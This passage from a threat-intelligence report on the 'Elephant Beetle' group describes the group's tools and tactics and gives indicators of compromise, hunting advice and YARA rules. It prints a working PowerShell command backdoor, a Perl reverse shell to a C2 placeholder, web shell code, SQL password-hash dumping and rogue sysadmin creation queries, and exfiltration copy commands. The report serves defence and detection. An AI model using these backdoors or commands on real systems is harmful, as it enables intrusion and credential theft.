Once executed, it binds with high port (65511, 65512 and 65513 were\nobserved) and receives the command to execute from a POST request to / via a URL parameter named ‘kmd’.\nThen the command is executed by cmd.exe, and the output is sent as the response. If the request is other than the\ndescribed above, the response will be 404.\n\n```\n[Reflection.Assembly]::LoadWithPartialName(System.Web) | Out-Null\nfunction extract($request) {\n  $length = $request.contentlength64\n  $buffer = new-object byte[] $length\n  [void]$request.inputstream.read($buffer, 0, $length)\n  $body = [system.text.encoding]::ascii.getstring($buffer)\n  $data = @{}\n  $body.split('&') | % { $part = $_.split('=')\n    $data.add($part[0], $part[1])\n  }\n  return $data\n}\n$routes = @{ POST / = { $data = extract $context.Request\n    $decode = [System.Web.HttpUtility]::UrlDecode($data.item('kmd'))\n    $Out = cmd.exe /c $decode 2>&1 | Out-String\n    return $Out\n  }\n}\n$url = 'http://*:65512/'\n$listener = New-Object System.Net.HttpListener\n$listener.Prefixes.Add($url)\n$listener.Start()\nwhile ($listener.IsListening) {\n  $context = $listener.GetContext()\n  $requestUrl = $context.Request.Url\n  $response = $context.Response\n  $localPath = $requestUrl.LocalPath\n  $pattern = {0} {1} -f $context.Request.httpmethod, $requestUrl.LocalPath\n  $route = $routes.Get_Item($pattern)\n  if ($route -eq $null) {\n    $response.StatusCode = 404\n  }\n  else {\n    $content = & $route\n    $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)\n    $response.ContentLength64 = $buffer.Length\n    $response.OutputStream.Write($buffer, 0, $buffer.Length)\n  }\n  $response.Close()\n  $responseStatus = $response.StatusCode\n}\n…\n\n```\n\n**Figure** **22:** **The** **decoded** **version** **of** **the** **one-liner** **PowerShell** **backdoor.**\n\n\n15\n\n\n-----\n\nThe second backdoor is a Perl one-liner back-connect backdoor; It was executed on compromised Linux\nmachines, and requires the C2 address and port for the outgoing connection. After establishing the connection,\nit executes an interactive shell that reads and writes from and to the socket.\n\n```\nperl -e 'use\nSocket;$i=<TARGET_IP>;$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(tcp));if(connect(S,soc\nkaddr_in($p,inet_aton($i)))){open(STDIN,>&S);open(STDOUT,>&S);open(STDERR,>&S);exec(/bin/sh -i);};\n\n```\n\n**Figure** **23:** **The** **Perl** **one-liner** **backdoor.**\n\nIn some cases, an additional backdoor was delivered to the victim machine named ‘Cli.exe’. This backdoor can\neither open a listener socket on the victim or actively connect back to Elephant Beetle’s C2 servers, allowing the\nexecution of shellcode on the host via encrypted tunnel. When used to connect to C2 servers, the malware uses\na set of hard coded certificates to establish the encrypted tunnel. The certificates were both created to be valid\nfrom March 29, 2018 UTC to January 16, 2021 UTC, with a difference of ~14 minutes.\n\n**_Figure_** **_24:_** **_The_** **_hard-coded_** **_certificates_** **_for_** **_the_** **_Backdoor's_** **_SSL_** **_encryption._**\n\n16\n\n\n-----\n\n#### The discovery phase\n\nThe attackers used and leveraged SQL servers that were accessible in the network, which usually are desirable\ntargets for attackers. During the discovery phase, the threat group scanned for internal MS-SQL servers. When\nfinding such servers, they attempted to leverage the ‘xp_cmdshell’ SQL procedure for executing commands\nremotely on the server.\n\nThe threat interacted with the internal SQL servers in three ways:\n\n1. Upload of a JSP/ASPX Web shell with SQL query capabilities to a web server that is accessible to the target MSSQL server. When this web shell was accessed, they provided the connection string and credentials of the\ntarget MS-SQL server.\n\n2. Upload of a custom Java tool for querying SQL databases, and execution with the Java binary residing on the\nexternal server. The tool accepts as a parameter the Base64 encoded SQL query and path to a configuration\nfile that contains the connection string and credentials of the target MS-SQL server.\n\n3. Use of the binary sqlcmd.exe for establishing SQL connection from a compromised SQL server to the target\nSQL servers.\n\nCode snippet from a JSP Web shell that allows SQL query execution:\n\n```\n…\ntry{\n  String down=request.getParameter(download);\n  if(down!=null){\n    response.setContentType(application/x-download);\n    response.setHeader(Content-Disposition, attachment; filename=dump.html);\n  }\n  String upd=request.getParameter(update);\n  if(upd!=null){\n  }\n  Connection conn = null;\n  Statement st;\n  ResultSet rs;\n  String q=request.getParameter(query);\n    Class.forName(request.getParameter(class));\n    conn = DriverManager.getConnection(request.getParameter(constr), request.getParameter(usr),\nrequest.getParameter(pwd));\n    st=conn.createStatement();\n    if(upd!=null){\n           st.executeUpdate(q);\n    } else {\n           rs=st.executeQuery(q);\n           ResultSetMetaData rsmd = rs.getMetaData();\n…\n\n```\n\n**Figure** **25:** **Code** **snippet** **from** **the** **JSP** **Web** **shell** **with** **the** **SQL** **query** **capabilities.**\n\n\n17\n\n\n-----\n\nCode snippet from the s0b.jar file (mentioned in the 2[nd] bullet above), which allows local and remote SQL\nconnections:\n\n```\n public static void main(String[] args) {\n  if (args.length < 2) {\n   System.out.println([-] Use: java -jar s0.jar [conf] [b64_query]);\n   System.exit(0);\n  }\n  String query = ;\n  try {\n   query = new String(MyBase64.decode(args[1]), UTF-8);\n…\n  try {\n   x.load(new FileInputStream(args[0]));\n   constr = x.getProperty(constr);\n   usr = x.getProperty(usr);\n   pwd = x.getProperty(pwd);\n   classx = x.getProperty(class);\n…\n  try {\n   Class.forName(classx).newInstance();\n   Connection conn = DriverManager.getConnection(constr, usr, pwd);\n   Statement st = conn.createStatement();\n   st.setQueryTimeout(6000);\n   if (isupdate == 1) {\n    st.executeUpdate(query);\n…\n\n```\n\n**Figure** **26:** **Code** **snippet** **of** **the** **SQL** **query** **JAVA** **tool.**\n\nAfter successful authentication with the target SQL server, the threat group performed reconnaissance activity by\nquerying for the SQL instance version and other properties - and then attempted to obtain the SQL user’s\npasswords as detailed below:\n\n```\nselect @@version\nSELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins\nSELECT name + ' ' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n\n```\n\n**Figure** **27:** **Example** **of** **executed** **recon** **and** **creds** **harvest** **commands** **on** **a** **compromised** **SQL.**\n\nTo maintain persistence on the compromised SQL servers, the threat group created MS-SQL local accounts and\nassigned them the ‘sysadmin’ role. The users were created via SQL connection using the EXEC statement for\nexecuting the “sp_addlogin” and “sp_addsrvrolemember” SQL procedures. ALTER SERVER ROLE was also\nexecuted afterwards since “sp_addsrvrolemember” was deprecated in the version of the compromised SQL\nserver, as in this command line example of SQL account creation and administrative role assignment:\n\n```\nEXEC sp_addlogin ‘<USERNAME>’, ‘<PASSWORD>’\nEXEC master.dbo.sp_addsrvrolemember ‘<USERNAME>’, ‘sysadmin’\nEXEC ALTER SERVER ROLE [sysadmin] ADD MEMBER [<USERNAME>]\n\n```\n\n**Figure** **28:** **Example** **of** **executed** **queries** **on** **a** **compromised** **SQL** **server** **for** **the** **privileged** **SQL** **account** **creation.**\n\n\n18\n\n\n-----\n\n#### On the move\n\nAs the attack reaches its final stages, the Elephant Beetle team especially enjoys a good Windows environment.\n\nWhen reaching a Windows domain environment, the threat group moved laterally and executed code remotely,\nwith both WMI and SMB – either directly (WMIC.exe binary) or with some supporting scripts to optimize their\noperations.\n\nFor lateral movement activity via SMB, the group leveraged the open-source script Invoke-SMBExec.ps1,[12] which\nis part of the Empire post exploitation framework. This PowerShell script allows remote code execution over\nWindows machines via SMB mechanism, and is well-known to be used by threat groups for lateral movement.\n\nThe main tool that the group leveraged for lateral movement activity via WMI was a modified version of the opensource pen testing script WmiExec.vbs[13] - a VBS script that allows code execution and remote control over\nWindows machines via WMI mechanism.\n\nThe customization was probably done to evade detection, as the main modifications were renaming indicative\nstrings or variables, and adding the string replace function to dynamically transform a textual string.\n\nSome of the modifications are highlighted in the following code snippet from the modified WmiExec.vbs script:\n\n```\nIf int4 < 2 Or int4 > 7 Then\n  WScript.Echo arg\n     WScript.Quit 1\nEnd If\nIf LCase(objArgs.Item(0)) <> /cmd And LCase(objArgs.Item(0)) <> /shell Then\n     WScript.Echo Mal!\n     WScript.Quit 1\nEnd If\nFileName = wmi.dll\nIf int4 > 5 Then\n     FileName=objArgs.Item(5)\n     WScript.Echo FN: & FileName\nEnd If\nConst timeOut = 1200\nfile = Path & \\ & FileName\nfile = Replace(file,\\\\,\\)\nFilePath = fso.GetParentFolderName(file)\nsandtime = timeOut\n….\nWScript.Echo Target -> & host\nWScript.Echo Connecting...\nSet objLocator = CreateObject(Replace(wbemZcripting.Zwbemlocator,Z,s))\n…\nFunction Exec(cmd, file)\n     Set objS = objWMIService.Get(Replace(xin32_ProcessStartup,x,W))\n\n```\n\n**Figure** **29:** **Code** **snippet** **of** **the** **group’s** **WmiExec.vbs** **modified** **version** **script.**\n\n12 https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-SMBExec.ps1\n13 https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs\n\n\n19\n\n\n-----\n\n#### How to fake legitimacy\n\nAs is typical, these attackers tried to maintain a low profile, even when they are well into the active attack phase.\nThe group took additional means to hide any files and outputs by relaying them between the compromised assets\nusing several techniques. One way to achieve this is by executing a custom Java tool that binds to a socket and\nsaves incoming data to a target file path.\n\n```\nimport java.io.BufferedOutputStream;\nimport java.io.FileOutputStream;\nimport java.io.InputStream;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\npublic class FileTransferServer {\n public static void main(String[] args) throws Exception {\n  if (args.length < 2) {\n   System.out.println( [+] Usage: Interface[localhost] Port /rout/to/save );\n   System.exit(0);\n  }\n  ServerSocket ssock = new ServerSocket(Integer.parseInt(args[1]));\n  System.out.println(\\n\\tListening.. );\n  Socket socket = ssock.accept();\n  System.out.println(\\n\\tConnected.. );\n  InetAddress IA = InetAddress.getByName(args[0]);\n  byte[] contents = new byte[10000];\n  FileOutputStream fos = new FileOutputStream(args[2]);\n  BufferedOutputStream bos = new BufferedOutputStream(fos);\n  InputStream is = socket.getInputStream();\n  int bytesRead = 0;\n  while ((bytesRead = is.read(contents)) != -1)\n   bos.write(contents, 0, bytesRead);\n  bos.flush();\n  socket.close();\n  ssock.close();\n  System.out.println(File sent succesfully!);\n }\n}\n\n```\n\n**Figure** **30:** **Code** **snippet** **of** **the** **file** **transfer** **Java** **tool.**\n\nAnother technique that was used for lateral tool and tools’ outputs transfer by the threat group was to copy the\ndesired files to transfer to accessible paths of a web application directory on web servers, and then access them\nas if they were legitimate web pages by custom VBS/Perl scripts.\n\nIn other cases, the threat actor placed exfiltrated files and reconnaissance execution output files in an accessible\npath, directly downloadable from the internet, bypassing any DLP solutions in place.\n\n```\ndim xHttp: Set xHttp = createobject(Msxml2.ServerXMLHTTP)\ndim bStrm: Set bStrm = createobject(Adodb.Stream)\nxHttp.Open GET, http://<Redacted>/<Redacted>/<filename>.zip, False\nxHttp.Send\nwith bStrm\n.type = 1\n.open\n.write xHttp.responseBody\n.savetofile C:\\windows\\temp\\<filename>.exe, 2\nend with\n\n```\n\n**Figure** **31:** **Code** **snippet** **from** **the** **file** **transfer** **VBS** **script.**\n\nIn addition to the two scenarios mentioned above, the group also deployed web shells with file upload/download\n\n20\n\n\n-----\n\ncapabilities and leveraged SMB protocol for transferring files between Windows machines by copying them to\nand from open shares.\n```\n cmd /c copy C:/temp/pr64.exe //<TARGET_SERVER>/c$/windows/temp/internal.exe\n cmd /c copy C:/temp/exfilitrated_data.zip //<INTERNET_FACING_WEB_SERVER>/c$/inetpub/wwwroot/\n\n```\n**Figure** **32:** **Example** **for** **copying** **Procdump** **over** **SMB** **and** **exfiltrating** **result**\n\nUsing all of these techniques, the group could stage files between different compromised assets without the need\nfor a complex backdoor tool on the assets.\n\n21\n\n```\ncmd /c copy C:/temp/exfilitrated_data.zip //<INTERNET_FACING_WEB_SERVER>/c$/inetpub/wwwroot/\n\n```\n\n-----\n\n### The attacker’s home base\n\nYet again, temp files play a role here. Temp files are labeled temporary for a reason: They need to be wiped\nout routinely and frequently.\n\nRegardless of its operating systems, the threat group used the temporary folder on the system as a working\ndirectory for the operations – C:\\Windows\\Temp on Windows system and /tmp on Linux systems.\n\nOn Linux systems, the threat group created hidden files and folders within the /tmp directory by adding . in the\nbeginning of the file/folder’s name – for example, /tmp/.<Folder>/.\n\nIn addition, the threat group tries to obfuscate their files using the target victim company name or file names that\nare being used by the company’s applications.\n\nAs part of the group’s work on compromised Windows machines, they often uploaded their tools, encoded with\nBase64, and then leveraged the Windows binary Certutil.exe for decoding the file content.\n\nAnother technique that was used by the threat group to obfuscate their data was to use the hexadecimal\nrepresentation of binaries. For encoding and decoding these binaries, the group leveraged a modified version of\na JScript tool that is found online[14].\n\n#### On harvesting credentials\n\nWhen searching for this (and other) attacks, remember the memory. The threat group was observed harvesting\ncredentials on Windows machines by using renamed versions of the ProcDump executable (pr.exe, pr64.exe and\nmore) for dumping the LSASS.exe process memory. In several instances, the group attempted to execute\nPWdump7 and a compiled version of Out-Minidump.ps1 for the same purpose.\n\nIn addition, they extracted the SAM and SYSTEM registry hives using Reg.exe binary for obtaining password hashes.\n\nWhen compromising Windows Domain Controllers servers, the group harvested the NTDS.DIT file and leveraged\nthe Impacket tool on the compromised DC to locally decrypt it.\n\nAfter harvesting the credentials, the group compressed the dump output with a 7zip binary that was uploaded to\nthe compromised machine. In several instances, the actor observed compressing the output in an organized way\nin which the compressed output file name was associated with the compromised machine (the file name pattern\nwas the string ls followed by the last two IP address octets – e.g., ls255.255.zip)\n\nFor local privilege escalation, the group was observed using IISCrack.dll,[15] which is a DLL side-loading technique\nfor loading a malicious version of httpodbc.dll on old IIS servers (CVE-2001-0507)[16]. Another tool that was used for\nthis purpose is incognito V2[17] – for token manipulation and impersonation.\n\n14 https://superuser.com/a/734359\n15 [https://www.giac.org/paper/gcih/297/gain-control-windows-2000-server-in-process-table-privilege-escalation-exploit/102330](http://www.giac.org/paper/gcih/297/gain-control-windows-2000-server-in-process-table-privilege-escalation-exploit/102330)\n16 [https://www.cvedetails.com/cve/CVE-2001-0507/](http://www.cvedetails.com/cve/CVE-2001-0507/)\n17 https://labs.f-secure.com/archive/incognito-v2-0-released/\n\n22\n\n\n-----\n\n### Elephant Beetle – Attribution\n\n#### Time to brush up your Spanish\n\nAfter responding to several incidents involving Elephant Beetle, Sygnia can confirm a high connection between\nthe threat group to Spanish speaking countries. The connection to a Latin American source is based on several\ndifferent factors including:\n\n- Keywords and phrases hardcoded into the tools that the group uses. These include for example a code\nvariable named ‘ELEPHANTE’ (Spanish for elephant) and output file names that the group uses like\n‘windows_para_linux’.\n\n- The majority of C2 IPs used by the threat group are located in Mexico.\n\n- Monitoring malicious files with Yara signatures and file hashes in publicly availably malware repositories found\nthat the targets of this group are Latin American. For example, one of the tools that the group uses to scan\ninternal networks ‘p.j’ was uploaded to Virus Total from Argentina. This again suggests the group targets\nSpanish speaking victims.\n\nAll the above suggest the origin of the threat group is a Latin American, with a high connection to Mexico.\n\n23\n\n\n-----\n\n### Hunting and defending against Elephant Beetle (a.k.a. “Elefante”)\n\nThis research was conducted for the purpose of exposing the Elefante threat group to the public by describing in\ndetail their modus operandi and detailing their tool arsenal.\n\nThe following are specific tactical recommendations that compliment more general security measures that can\nprotect and hunt against these types of attacks:\n\n - Maintain applications and keep operating systems up-to-date, especially on internet-facing servers.\n\n - Avoid using clear-text credentials in scripts.\n\n - Avoid using the same password for different administrative interfaces on different servers.\n\n - Avoid using the ‘xp_cmdshell’ procedure and disable it on MS-SQL servers. Monitor for configuration\n\nchanges and usage of ‘xp_cmdshell’.\n\n - Monitor on WAR deployments and validate that the packages deployment functionality is included in the\n\nlogging policy of the relevant applications.\n\n`o` In some cases, the application error logs may contain information about exceptions and errors\nthat are related to the WAR deployment and Web shell access.\n\n - Hunt and monitor for presence and creation of suspicious .class file in the WebSphere applications temp\n\nfolders, such as:\n\n`o` .class files that were found under the WebSphere applications temp folders contained web\nshells, and some of those that did not had a matching JSP web shell file on the compromised\nserver, meaning they were likely deleted since they were deployed and used.\n\n`o` According to IBM documentation[18], WebSphere loads JSP .class files at runtime, from either the\nWebSphere Application Server temp directory or from a web module's WEB\nINF/classes directory. If the class file does not exist, it will be generated inside the WebSphere\nApplication temp directory, on the first time that the JSP resource was requested. This means\nthat the .class creation time is indicative of the ‘.jsp’ file first access.\n\n`o` .class files can be easily decoded/reflected to show large parts of their original JSP code.\n\n - Hunt and monitor for presence and creation of web pages in static resources folders of Web applications.\n\n - Monitor for processes that were executed by either web server parent services processes (i.e., ‘w3wp.exe’,\n\n‘tomcat6.exe’) or by database-related processes (i.e., ‘sqlservr.exe’).\n\n`o` ‘cmd.exe’, ‘powershell.exe’, ‘wmic.exe’ and other code execution-related executables are\nhighly suspicious.\n\n - Implement and verify segregation between DMZ and Internal server. Close monitoring and access control\n\nover these regions is important to delay/stop malicious actors from moving forward after compromising a\nweb server.\n\n - Proactively hunt for Elephant Beetle IOCs and TTPs within the network, based on the MITRE ATT&CK\n\nbreakdown and IOC provided below.\n\n18 [https://www.ibm.com/support/knowledgecenter/SSEQTP_8.5.5/com.ibm.websphere.base.iseries.doc/ae/cweb_jspclassfiles.html](http://www.ibm.com/support/knowledgecenter/SSEQTP_8.5.5/com.ibm.websphere.base.iseries.doc/ae/cweb_jspclassfiles.html)\n\n24\n\n\n-----\n\n## Indicators of Compromise\n\n### Web Shells File Names and MD5 Hashes\n\n**MD5** **Tool** **Description** **File** **Name**\n\n\n##### 2B3211ADFA73E2508E98A09A54FE9755 Linux Command Execution\n\n C4549F17EF9C26A1F0878A0D2108876C Linux Command Execution\n\n D3C04EED90A086F04D838BFE47753CCA Linux Command Execution\n\n 6B7A67204C6369623E449D1C476E3273 Linux Obfuscated Command Execution\n\n AC8F639687F62FDEEDCC48007C579A3A Linux Obfuscated Command Execution\n\n C4C5FFC3754DF0585695F8FD63A2A977 Windows Command Execution (Simple)\n\n 27C9E13C9D82935D1B199E2E0BBD262B Windows Command Execution\n\n CBA007CBD25CAD73CE80A8AC3DD90864 Windows Command Execution\n\n EB1E6E3D8B1CD2ABC65D080A610A0230 Windows Command Execution\n\n\n##### cmd-pro.jsp\n\n Thumbs.jsp\n\n .login-n.jsp\n\n greeting.jsp\n\n one-lin.jsp\n\n _example.jsp\n\n .login-w.jsp\n\n cmd-prow.jsp\n\n xbin10x.jsp\n\n\n##### 93F95277642B592F9CE30E1C3C684866 File Downloader dn.jsp\n\n 096D652310C3B248015242DB427ACDED jspFileBrowser font-awesome.max6.jsp\n\n 481FFF46383B00B534EF53FE87579435 jspFileBrowser id_win.jsp\n\n 591D4DF7A83856B49158DC8D34F16C3B jspFileBrowser logos.jsp\n\n 5E83F542F729F7AE77982826E6BFAA0C jspFileBrowser shell.jsp\n\n spacer.jsp\n\n A3AF470DEFC75728677925033D4F4635 jspFileBrowser id.jsp\n\n CFE3E93698F6D8C6BE8713DCD3A401D1 jspFileBrowser idpost.jsp\n\n E1A8F9AC2C3E069975C451A072C02F94 JspSpy 20170219.jsp\n\n\n##### 590852C116DA7E63D806DC6843846F31 MiniWebCmdShell_HeartL ESS\n\n CC187F69FCFB943284F90E4D9815AEF7 Multiple Capabilities Web Shell\n\n\n##### jsfshell.xhtml\n\n sw3.jsp\n\n\n##### 2DCB13E75E9B58B9546154E00A0B9665 Proxy proxy-jsp.jsp\n\n 835C002731D5068D383E7CBEC8D22F2B Proxy manager10.jsp\n\n\n25\n\n\n-----\n\n**MD5** **Tool** **Description** **File** **Name**\n\n##### 98B01D5CBC2198DF4EAFF65A2E2A1127 Proxy l0g.jsp\n\n F4F42C28E29A92C8E80BAD64358B4083 Proxy Heed.jsp\n\n HelloHTML.jsp\n\n HitCount.jsp\n\n FC2C2A272D97993E3187414D12C96249 Proxy style.jsp\n\n FEBA4618133D115B5CF1075CCC20AE79 Proxy HelpSessions.jsp\n\n AC3B4ECACFAAC834DA24FA8DD380606C reGeorge preaproveWelcome.jsp\n\n wm_cfshared.jsp\n\n 76F9069CA5EA43B97E6F7058D86E26CB Sniffer pro.php\n\n 9C8DC2BF1CB2DF5F5EFE344AA5F99C63 SQL Query Execution (JSP) sql.jsp\n\n 562F0570530C7F7DDF844A7EB88A0D43 SQL Query Execution (VBS) msok.aspx\n\n 0F14FAD6FCADC250F1E8873DA22143E2 File Uploader .logon.svg.jsp\n\n .logo.svg.jsp\n\n welcome.jsp\n\n regular.woff.jsp\n\n CCF944D173B51247361C92B321269C9B File Uploader ex-ample.jsp\n\n DC302B4602CAFC6CC95DBA6316285E26 File Uploader upload.jsp\n\n 6F7A2C1D59FB896B42B8116FC1330FCC Encoded File Uploader ex-b.jsp\n\n AFC8C13CD1E0809DBED23BDC75474747 Encoded File Uploader up-base.jsp\n\n E47F5F5E31B842866585C7FD486FD815 UploadFileGASP _ap.asp\n\n 78BB6EB5BC84ACDFD4B07F462A3BB971 Obfuscated File Uploader index.php\n\n\n##### 37A6D23B84A9477888678060ED4A3EF8 Windows Command Execution (WScript)\n\n\n##### logo_sbi.asp\n\n\n##### 836E64ADE11315CD7BB485E85C4EAA42 Obfuscated Windows iisstart.aspx\n\n\n##### Command Execution (WScript)\n\n\n##### logo_sbi.aspx\n\n\n##### N/A File Uploader .logon.svg.jsp\n\n regular.woff.jsp\n\n N/A HTTP Proxy favicon.jsp\n\n favic0n.jsp\n\n\n26\n\n\n-----\n\n### Malicious WAR File Names and MD5 Hashes\n\n**MD5** **Tool** **Description** **File** **Name**\n\n##### 05355B74CA15B230E64A419C1F97E99E WAR containing Web shells invoker.war\n\n 5045679706EB31A0989E49CCE1DDE5E0 WAR containing Web shells exampl3s.war\n\n 6251920D4F0D6E9C176790F0757D4761 WAR containing Web shells wsexample.war\n\n E20BAFF34F7333C9CC92908BAD2C1091 WAR containing Web shells cmd.war\n\n### Custom Java Tools Files Names and MD5 Hashes\n\n**MD5** **Tool** **Description** **File** **Name**\n\n##### D1246F01DDB3C0C74C8C48DFEC18EC47 Port Scanner (Version 1) sp.j\n\n 4701909F47BBA7B0EB33A3DE944A9F04 Port Scanner (Version 1.1) w.j\n\n 33C22962E43CEF8627CBC63535F33FCE Port Scanner (Version 1.2) p.j\n\n F4B56E8B6C0710F1E8A18DC4F11A4EDC Port Scanner (Version 1.2) p.j\n\n ports-ng.j\n\n 7AF2CEC0EF9BE0C8BE2A0CF8D2347D89 Port Scanner(No version) sps.j\n\n EA67A59CC3DF42340EBCB92686C3203F Port Scanner(No version, SSL supported) wps.j\n\n B130215DD140FA47D06F6E1D5AD8E941 File Transfer fsrv.j\n\n 254D3286F92CDF2377B452231D03C0C0 Port Forwarding pf.j\n\n 4BED9C8D06A3BA7215C49F139CA0DD16 SQL Query s0b.j\n\n D68E47A6162DA5C13B6BAF14EA060860 SSL Fingerprint sl.j\n\n 82667FC82BA7A7249C4BBC9296441113 JSocks js.j\n\n### Additional Tools File Names and MD5 Hashes\n\n**MD5** **Tool** **Description** **File** **Name**\n\n##### BADBE22F22556E60F446D371E99F19E8 WmiExec.vbs netlogon.vbs\n\n x8_in.vbs\n\n 154A6BFE1B651582F77341561FDC68A4 WmiExec.vbs x8.vbs\n\n A33F7ED0E9CED177647FE38B083BBFEA cURL(Base64 Encoded) cc\n\n 274A9BF3F78BDFC3FBB63520B2C0A9BD cURL VBS implementation N/A (Base64 decoded version of cc)\n\n27\n\n\n-----\n\n**MD5** **Tool** **Description** **File** **Name**\n\n##### 5B306430ED7F9DB91C94CA6A9B065EFE cURL(Base64 Encoded) la.sys\n\n 089542D815FBB1BFD7FFC962131F82BE cURL VBS implementation N/A (Base64 decoded version of la.sys)\n\n E911A696064AB6FE659E5214017DBAAD cURL VBS implementation curl.vbs\n\n 4926D1B5D792793CCCB46FEAF17E72AE Port Scanner (Base64 Encoded) ggg.1\n\n\n##### 9297AFE02616958E157A675E56AFCB77 Port Scanner (Perl implementation)\n\n D8801A7B154DD3E231477EED0CDC759A Port Scanner (Perl implementation)\n\n\n##### N/A (Base64 decoded version of ggg.1)\n\n ggg\n\n\n##### D37549C3D7166CE14D0803A1909FEDFA querySPN.vbs spn.vbs\n\n 9E484E32505758A6D991C33652AD1B14 Invoke-SMBExec insm.ps1\n\n 879E2DA280D3E004A1E762C718EDABB9 MSSQLLinkPasswords dec.ps1\n\n DB975B51A999D84835C71F73F83B1862 Impacket sd.exe\n\n 4489E8CB847CCCF4D2D87EE3372E8235 IncognitoV2 inco.exe\n\n 0B26021F37F01F00CC6CF880BD3D7F68 Out-Minidump out-minid.exe\n\n 6A09BC6C19C4236C0BD8A01953371A29 ProcDump pr.exe\n\n 6E0BD9113D86E8B0BACA936FC508AE73 ProcDump pr200.exe\n\n A92669EC8852230A10256AC23BBF4489 ProcDump pr64.exe\n\n D1337B9E8BAC0EE285492B89F895CADB PwDump7 Pw7.exe\n\n B2057B29AF51578340CEB87784B6B703 IISCrack httpodbc.dll\n\n 572FDD23399EB5612C62A0906AD50C06 CVE-2015-7450 Exploit cur.py\n\n 56CFCD709B5BEA9F7EB49E959EE15A7E CVE-2015-7450 Exploit curl.py\n\n 577E181EC1D59BCCBF181391944D66E2 CVE-2015-7450 Exploit pypost.py\n\n A43F35A71450EDF3741D530F8383BBEF CVE-2015-7450 Exploit (Payload) wr2.txt\n\n 0D7A08E7F58BFE020C59D739911EE519 Sniffer RawCap.exe\n\n\n28\n\n\n-----\n\n### YARA Signatures\n\nHTTP Tunneller Web Shell\n\n```\nrule elephant_webshell_http_tunneller\n{\n  meta:\n    copyright = Sygnia\n    description = HTTP Tunneller Web Shell\n    author = Amnon Kushnir\n    date = 22/04/2019\n  strings:\n    $str0 = \"requestx=request.getParameter(\\\"\" wide ascii\n    $str1 = \"outSocket.write(hexStringToByteArray(requestx))\" wide ascii\n    $re0 = /Socket\\s\\w+\\s?\\=\\s?new\\sSocket\\(\\)s?\\;/\n    $ssl0 = \"host.replaceAll(\\\"do-ssl-zero\\\\\\\\.\\\",\\\"\\\")\" wide ascii\n    $ssl1 = \"context.init(null, trustAllCerts, new java.security.SecureRandom())\" wide ascii\n  condition:\n    ($re0 and 1 of ($str*)) or all of ($ssl*)\n}\n\n```\n\nFile Uploader Web Shell\n\n```\nrule elephant_webshell_file_uploader\n{\n  meta:\n    copyright = Sygnia\n    description = File Uploader Web Shell\n    author = Amnon Kushnir\n    date = 22/04/2019\n  strings:\n    $str0 = \"FileOutputStream(request.getParameter(\\\"f\\\")\" wide ascii\n    $str1 = \"request.getParameter(\\\"t\\\")\" wide ascii\n    $re0 =\n/FileOutputStream\\(request\\.getParameter\\s*\\(\\\"\\w+\\\"\\)\\)\\)\\.write\\(request\\.getParameter\\s*\\(\\\"\\w+\\\"\\)/\n  condition:\n    $re0 or all of ($str*)\n}\n\n```\n\nCommand Execution Web Shell (JSP Version)\n\n```\nrule elephant_webshell_cmd_exec_jsp\n{\n  meta:\n    copyright = Sygnia\n    description = Command Execution JSP Web Shell\n    author = Amnon Kushnir\n    date = 22/04/2019\n  strings:\n    $obf0 = \"\\\"TbinTsh\\\".replaceAll(\\\"T\\\",\\\"/\\\")\" wide ascii\n    $param0 = \"request.getHeader(\\\"zc\\\")\" wide ascii\n    $param1 = \"request.getParameter(\\\"cxc\\\")\" wide ascii\n    $param2 = \"request.getParameter(\\\"runit\\\")\" wide ascii\n    $exec0 = \".getRuntime().exec(\" wide ascii\n    $exec1 = \"probuilder.start();\" wide ascii\n    $re0 = /\\{\\\"[^\\\"]*\\\"\\, \\\"(\\/|\\+)c\\\"\\, request\\.getParameter\\(\\\"\\w*\\\"\\)\\}/\n  condition:\n    $re0 or $obf0 or (1 of ($param*) and 1 of ($exec*))\n}\n\n```\n\n29\n\n\n-----\n\nCommand Execution Web Shell (ASPX Version)\n\n```\nrule elephant_webshell_cmd_exec_aspx\n{\n  meta:\n    copyright = Sygnia\n    description = Command Execution ASPX Web Shell\n    author = Amnon Kushnir\n    date = 22/04/2019\n  strings:\n    $init0 = \"CreateObject(\\\"WScript.Shell\\\")\" wide ascii\n    $init1_obf = \"CreateObject(Replace(\" wide ascii\n    $param0 = \"Request.Form(\\\"cmd\\\")\" wide ascii\n    $param1 = \"Request.Form(\\\"sect\\\")\" wide ascii\n    $exec0 = \".Exec(\" wide ascii\n    $exec1 = \".StdOut.Readall()\" wide ascii\n    $exec2 = \"Response.Write\" wide ascii\n  condition:\n    1 of ($init*) and (1 of ($param*) and all of ($exec*))\n}\n\n```\n\nWmiExec.vbs\n\n```\nrule elephant_wmiexec_tool_vbs\n{\n  meta:\n    copyright = Sygnia\n    description = Elephant Beetle’s modified WmiExec.vbs tool\n    author = Amnon Kushnir\n    date = 22/04/2019\n  strings:\n    $obf0 = \"objWMIService.Get(Replace(\"\n    $obf1 = \"CreateObject(Replace(\"\n    $str0 = \"elefante.Run\" wide ascii\n    $str1 = \"Set elefante\"\n    $str2 = \"WScript.Echo \\\"Mal!\\\"\" wide ascii\n    $str3 = \"domain = objArgs.Item(4)\" wide ascii\n    $str4 = \"sandtime = timeOut\" wide ascii\n    $str5 = \"WScript.Sleep(sandtime)\" wide ascii\n    $str6 = \"strResult = doo(\" wide ascii\n    $str7 = \"\\\"MS_409\\\",\\\"NTLMDomain:\\\" & domain\" wide ascii\n    $str8 = \"B64Dec( objArgs.Item(int4 - 1) ) \" wide ascii\n   condition:\n    1 of ($obf*) and 2 of ($str*)\n}\n\n```\n\n30\n\n\n-----\n\nJSP Web shell for SQL query execution\n\n```\nrule elephant_webshell_sql_jsp\n{\n  meta:\n    copyright = Sygnia\n    description = SQL Query Execution JSP Web Shell\n    author = Amnon Kushnir\n    date = 03/06/2020\n  strings:\n    $param0 = \"request.getParameter(\\\"constr\\\")\"\n    $init0 = \"response.setHeader(\\\"Content-Disposition\\\", \\\"attachment; filename=dump.html\\\");\" wide\nascii\n    $sql_conn_init1 = \".getConnection(request.getParameter(\" wide ascii\n    $sql_conn_init2 = \".forName(request.getParameter(\" wide ascii\n    $exec0 = \".executeUpdate(\" wide ascii\n    $exec1 = \".executeQuery(\" wide ascii\n    $exec2 = 